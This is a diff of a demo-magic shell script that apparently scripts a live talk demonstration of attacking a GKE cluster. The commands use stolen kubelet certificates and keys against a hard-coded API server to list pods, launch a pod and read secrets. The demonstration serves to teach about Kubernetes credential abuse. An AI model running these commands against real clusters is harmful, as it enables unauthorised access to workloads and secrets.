@@ -3,7 +3,6 @@
 # $Id: $
 
 set -o errexit
-set -o nounset
 set -o pipefail
 
 : ${PROJECT:="gcastle-gke-dev"}
@@ -16,14 +15,16 @@ if [ ! -f $DEMOMAGIC ]; then
   wget -q https://raw.githubusercontent.com/paxtonhare/demo-magic/master/demo-magic.sh 
 fi
 
+DEMO_PROMPT="attacker_machine$ "
 . demo-magic.sh -d
+clear
 
-p "curl -X POST -H \"Content-Type: application/json\" -d '{\"access_token\":ya29.c...}' https://www.googleapis.com/oauth2/v2/tokeninfo"
+# Not sure this is worth demonstrating, cover in the slide.
+#p "curl -X POST -H \"Content-Type: application/json\" -d '{\"access_token\":ya29.c...}' https://www.googleapis.com/oauth2/v2/tokeninfo"
 
 # Print output to save token handling
 #curl -X POST -H "Content-Type: application/json" -d '{"access_token":"ya29.c...}' https://www.googleapis.com/oauth2/v2/tokeninfo
 
-# Not sure this is worth demonstrating, cover in the slide.
 #cat << EOF
 #{
 #  "issued_to": "112061657786725890568",
@@ -36,10 +37,19 @@ p "curl -X POST -H \"Content-Type: application/json\" -d '{\"access_token\":ya29
 
 # empty kubeconfig to make sure we're acting as the kubelet
 export KUBECONFIG=$(mktemp /tmp/kubeconfig.XXXXXX)
-pe "kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get pods --all-namespaces" || true
-pe "kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 -n default get pods"
-pe "kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 run newnx --image=nginx"
-pe "kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get secrets" || true
-pe "kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 auth can-i create certificatesigningrequests"
+p "kubectl --client-certificate ../kubelet_keys/client.crt \ "
+DEMO_PROMPT="> "
+p "--client-key ../kubelet_keys/client.pem \ "
+p "--certificate-authority ../kubelet_keys/ca.crt \ "
+p "get pods --all-namespaces"
+DEMO_PROMPT="attacker_machine$ "
+kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get pods --all-namespaces
+p "kubectl run newnx --image=nginx"
+kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 run newnx --image=nginx || true
+p "kubectl get secrets"
+kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get secrets
+
+#p "kubectl auth can-i create certificatesigningrequests"
+#kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 auth can-i create certificatesigningrequests
 
 
